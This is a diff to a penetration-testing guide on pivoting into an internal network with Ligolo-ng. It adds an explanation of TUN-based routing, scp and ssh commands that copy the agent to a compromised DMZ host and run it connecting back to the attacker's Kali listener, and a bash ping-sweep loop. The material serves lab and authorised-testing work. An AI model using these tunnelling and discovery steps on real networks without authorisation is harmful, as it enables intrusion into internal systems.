@@ -12,6 +12,8 @@
 * **Native Tool Support:** SYN scans (`nmap -sS`), ICMP pings, UDP scans, and tools that ignore socks proxies work natively through standard routing table rules.
 * **High Performance:** Operates over a multiplexed TLS connection, avoiding the overhead, thread lockups, and timeouts common with Proxychains and SOCKS proxies.
 
+Ligolo-ng operates at Layer 3 using a virtual TUN interface rather than a SOCKS proxy. This eliminates the need for Proxychains and allows your tools to route traffic natively into the internal subnet.
+
 ---
 
 ## 2. Architecture Overview
@@ -77,7 +79,7 @@ Run the proxy listener. By default, it accepts incoming agent connections on por
 ```
 
 ### Step 3: Transfer & Execute Agent on Compromised DMZ Host
-
+Transfer the Linux agent binary to the pivot machine (192.168.80.10) via SSH/SCP and execute it, pointing back to your Kali IP:
 Stage the agent binary from Kali to the DMZ Linux machine:
 
 ```bash
@@ -92,6 +94,9 @@ chmod +x agent
 # Connect back to your Kali machine's Ligolo listener
 ./agent -connect 10.10.200.30:11601 -ignore-cert
 
+# using scp 
+scp ./agent user@192.168.80.10:/tmp/agent
+ssh user@192.168.80.10 "chmod +x /tmp/agent && /tmp/agent -connect <KALI_IP>:11601 -ignore-cert"
 ```
 
 ---
@@ -139,6 +144,10 @@ With the routing table configured, all network scanning utilities run natively f
 ```bash
 # Ping sweep / ICMP discovery
 fping -a -g 192.168.98.0/24 2>/dev/null
+
+# one liner bash command to check for Live hosts
+for i in $(seq 1 254); do ping -c 1 -W 1 192.168.98.$i >/dev/null && echo "192.168.98.$i is UP"; done
+
 
 # Nmap host discovery (TCP SYN ping + ACK ping across common AD ports)
 nmap -sn -PS88,135,139,445,3389 192.168.98.0/24
